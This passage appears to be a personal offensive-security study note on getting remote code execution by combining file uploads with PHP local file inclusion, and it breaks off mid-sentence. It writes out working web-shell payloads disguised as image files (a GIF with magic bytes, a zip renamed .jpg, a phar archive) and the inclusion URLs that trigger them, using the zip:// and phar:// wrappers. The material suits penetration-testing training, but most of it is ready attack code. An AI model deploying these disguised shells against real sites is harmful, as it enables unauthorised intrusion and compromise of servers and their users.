For LFI to work in file uploads, the file upload form do not need to be vulnerable, but merely allow us to upload files. If the vulnerable function has code `Execute` [capabilities](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FFile%20Inclusion%20Vulnerabilities%2FRead%20vs%20Execute), then the code within the file we upload will get executed if we include it, regardless of the file extension or file type.

For example, we can upload an image file (e.g. `image.jpg`), and store a PHP web shell code within it 'instead of image data', and if we include it through the LFI vulnerability, the PHP code will get executed and we will have remote code execution.
## Crafting Malicious Image
The first step is to create a malicious image file containing a shell code that still looks and works as an image. The file should still include the image magic bytes at the beginning of the file content (i.e `GIF8`), just in case the upload form checks for both the extension and content type as well. For example:
```bash
echo 'GIF8<?php system($_GET["cmd"]) ?>' > shell.gif
```
This file on its own is completely harmless and would not affect normal web applications in the slightest. However, if we combine it with an LFI vulnerability, then we may be able to reach remote code execution.

Once the malicious file has been uploaded, all we need to do is include it through the LFI vulnerability. To do this, we need to know the path of the uploaded file. In most cases, especially with images, we can get its path from inspecting the source code after uploading the image.
```txt
http://target-website.com/?language=./images/shell.gif&cmd=id
```
## Zip Upload
There are a couple of other PHP-only techniques that utilize PHP wrappers to achieve the same goal. These techniques may become handy in some specific cases where the above technique does not work.

We can utilize the [zip](https://www.php.net/manual/en/wrappers.compression.php) wrapper to execute PHP code. However, this wrapper isn't enabled by default, so this method may not always work. To do so, we can start by creating a PHP web shell script and zipping it into a zip archive (named `shell.jpg`), as follows:
```bash
echo '<?php system($_GET["cmd"]) ?>' > shell.php && zip shell.jpg shell.php
```
> Note: Even though we named our zip archive as (shell.jpg), some upload forms may still detect our file as a zip archive through content-type tests and disallow its upload, so this attack has a higher chance of working if the upload of zip archives is allowed.

Once we have uploaded `shell.jpg`, we can include it with the `zip` wrapper as follows:
```txt
http://target-website.com/?language=zip://./images/shell.jpg#shell.php&cmd=id
```
## Phar Upload
Finally, we can use the `phar://` wrapper to achieve a similar result. To do so, we will first write the following PHP script into a `shell.php` file:
```php
<?php

$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->addFromString('shell.txt', '<?php system($_GET["cmd"]); ?>');
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->stopBuffering();
```
Next we will combine this script into a `phar` file that when called would write a web shell to a `shell.txt` sub-file, which we can interact with:
```bash
php --define phar.readonly=0 shell.php && mv shell.phar shell.jpg
```
Now, we should have a `phar` file called `shell.jpg`, next we uplo